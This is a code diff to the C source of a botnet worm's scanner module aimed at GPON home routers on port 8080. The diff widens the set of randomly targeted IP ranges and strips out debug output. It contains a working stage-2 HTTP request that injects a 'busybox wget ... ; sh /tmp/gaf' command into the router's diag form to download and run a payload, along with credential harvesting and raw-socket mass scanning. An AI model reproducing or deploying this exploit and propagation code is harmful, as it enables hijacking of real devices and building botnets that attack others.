@@ -2,9 +2,7 @@
 
 #define _GNU_SOURCE
 
-#ifdef DEBUG
-    #include <stdio.h>
-#endif
+
 #include <unistd.h>
 #include <stdlib.h>
 #include <sys/socket.h>
@@ -16,8 +14,9 @@
 #include <signal.h>
 #include <errno.h>
 #include <string.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
 
 #include "includes.h"
 #include "gpon8080_scanner.h"
@@ -32,7 +31,7 @@ struct gpon8080_scanner_auth *gpon8080_auth_table = NULL;
 struct gpon8080_scanner_connection *conn_table;
 uint16_t gpon8080_gpon8080_auth_table_max_weight = 0;
 uint32_t gpon8080_fake_time = 0;
-int gpon8080_ranges[] = {189,187,201};
+int gpon8080_ranges[] = {189,187,201,190,200,153,180,191,210,177,179,45,103,116,118,72,73,46,47,48,49,50,51,52,58,59,60,61,104,105,106,107,108,109,110,111,112,113,114,115,117,119,120,121,122,123,124,125,175,176,178,181,182,183,184,185,186,188};
 int gpon8080_recv_strip_null(int sock, void *buf, int len, int flags)
 {
     int ret = recv(sock, buf, len, flags);
@@ -80,18 +79,14 @@ void gpon8080_scanner(void)
     // Set up raw socket scanning and payload
     if((gpon8080_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
     {
-        #ifdef DEBUG
-            printf("[scanner] failed to initialize raw socket, cannot scan\n");
-        #endif
+        
         exit(0);
     }
     fcntl(gpon8080_rsck, F_SETFL, O_NONBLOCK | fcntl(gpon8080_rsck, F_GETFL, 0));
     i = 1;
     if(setsockopt(gpon8080_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
     {
-        #ifdef DEBUG
-            printf("[scanner] failed to set IP_HDRINCL, cannot scan\n");
-        #endif
+        
         close(gpon8080_rsck);
         exit(0);
     }
@@ -120,9 +115,7 @@ void gpon8080_scanner(void)
     tcph->window = rand_next() & 0xffff;
     tcph->syn = TRUE;
 
-    #ifdef DEBUG
-        printf("[scanner] scanner process initialized. scanning started.\n");
-    #endif
+    
 
     // Main logic loop
     while(TRUE)
@@ -147,12 +140,12 @@ void gpon8080_scanner(void)
                 iph->saddr = LOCAL_ADDR;
                 iph->daddr = get_random_gpon8080_ip();
                 iph->check = 0;
-                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
+                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);
 
                 tcph->dest = htons(8080);
                 tcph->seq = iph->daddr;
                 tcph->check = 0;
-                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
+                tcph->check = checksum_tcpudp(iph, (uint16_t *)tcph, sizeof(struct tcphdr), sizeof(struct tcphdr));
 
                 paddr.sin_family = AF_INET;
                 paddr.sin_addr.s_addr = iph->daddr;
@@ -230,9 +223,7 @@ void gpon8080_scanner(void)
 
             if(conn->state != GPON8080_SC_CLOSED && (gpon8080_fake_time - conn->last_recv) > timeout)
             {
-                #ifdef DEBUG
-                    printf("[scanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
-                #endif
+                
 
                 close(conn->fd);
                 conn->fd = -1;
@@ -281,9 +272,7 @@ void gpon8080_scanner(void)
 
                     if(conn->state == GPON8080_SC_EXPLOIT_STAGE2)
                     {
-                        #ifdef DEBUG
-                            printf("[scanner] FD%d request sent to %d.%d.%d.%d\n", conn->fd, conn->dst_addr & 0xff, (conn->dst_addr >> 8) & 0xff, (conn->dst_addr >> 16) & 0xff, (conn->dst_addr >> 24) & 0xff);
-                        #endif
+                        
 
                         // build stage 2 payload
                         util_strcpy(conn->payload_buf, "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nUser-Agent: Hello, World\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`busybox+wget+http://0.0.0.0/gpon+-O+/tmp/gaf;sh+/tmp/gaf`&ipv=0");
@@ -317,9 +306,7 @@ void gpon8080_scanner(void)
                 }
                 else
                 {
-                    #ifdef DEBUG
-                        printf("[scanner] FD%d error while connecting = %d\n", conn->fd, err);
-                    #endif
+                    
 
                     close(conn->fd);
                     conn->fd = -1;
@@ -349,9 +336,7 @@ void gpon8080_scanner(void)
                     ret = gpon8080_recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, GPON8080_SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                     if(ret == 0)
                     {
-                        #ifdef DEBUG
-                            printf("[scanner] FD%d connection gracefully closed (stage %d)\n", conn->fd, conn->state);
-                        #endif
+                        
                         errno = ECONNRESET;
                         ret = -1;
                     }
@@ -361,9 +346,7 @@ void gpon8080_scanner(void)
                         {
                             if(conn->state == GPON8080_SC_EXPLOIT_STAGE2)
                             {
-                                #ifdef DEBUG
-                                    printf("[scanner] FD%d resetting connection preparing to continue with stage 2 of the exploit\n", conn->fd);
-                                #endif
+                                
                                 close(conn->fd);
                                 gpon8080_setup_connection(conn);
                                 continue;
@@ -393,9 +376,7 @@ void gpon8080_scanner(void)
                         {
                             if(strstr(out, ""))
                             {
-                                #ifdef DEBUG
-                                    printf("[scanner] FD%d parsing credentials...\n", conn->fd);
-                                #endif
+                                
 
                                 memmove(out, out + 11, strlen(out));
 
@@ -418,9 +399,7 @@ void gpon8080_scanner(void)
 
                     if(conn->credentials[0] == NULL && conn->credentials[1] == NULL)
                     {
-                        #ifdef DEBUG
-                            printf("[scanner] FD%d failed to retrieve credentials\n", conn->fd);
-                        #endif
+                        
                         close(conn->fd);
                         conn->fd = -1;
                         conn->state = GPON8080_SC_CLOSED;
@@ -430,9 +409,7 @@ void gpon8080_scanner(void)
                     }
                     else
                     {
-                        #ifdef DEBUG
-                            printf("[scanner] FD%d retrieved user: %s, pass: %s changing exploit stages\n", conn->fd, conn->credentials[0], conn->credentials[1]);
-                        #endif
+                        
 
                         close(conn->fd);
                         conn->fd = -1;
@@ -460,9 +437,7 @@ static void gpon8080_setup_connection(struct gpon8080_scanner_connection *conn)
 
     if((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
-        #ifdef DEBUG
-            printf("[scanner] failed to call socket()\n");
-        #endif
+        
         return;
     }
 
@@ -508,5 +483,5 @@ static ipv4_t get_random_gpon8080_ip(void)
     return INET_ADDR(o1,o2,o3,o4);
 }
 
-#endif
 
+#endif
